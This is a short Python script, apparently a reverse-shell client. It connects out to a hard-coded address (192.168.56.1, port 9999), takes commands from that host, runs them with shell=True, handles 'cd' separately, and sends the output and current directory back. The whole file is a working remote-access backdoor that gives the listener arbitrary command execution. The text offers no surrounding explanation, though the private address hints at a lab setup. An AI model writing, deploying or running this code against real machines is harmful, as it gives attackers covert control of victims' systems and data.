import socket
import os
import subprocess

def execute_command(command):
    try:
        output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output_bytes, errors_bytes = output.communicate()
        
        output_str = output_bytes.decode("utf-8") + errors_bytes.decode("utf-8")
        return output_str
    except Exception as e:
        return str(e)

s = socket.socket()

host = '192.168.56.1'
port = 9999

s.connect((host, port))

while True:
    data = s.recv(1024).decode("utf-8")

    if len(data) > 0:
        if data[:2] == 'cd':
            directory = data[3:].strip()
            try:
                os.chdir(directory)
                response = "Directory changed to " + os.getcwd()
            except Exception as e:
                response = str(e)  
        else:
            response = execute_command(data)

        currentWD = os.getcwd() + ">"
        s.send(str.encode(response + currentWD))
        print(response)
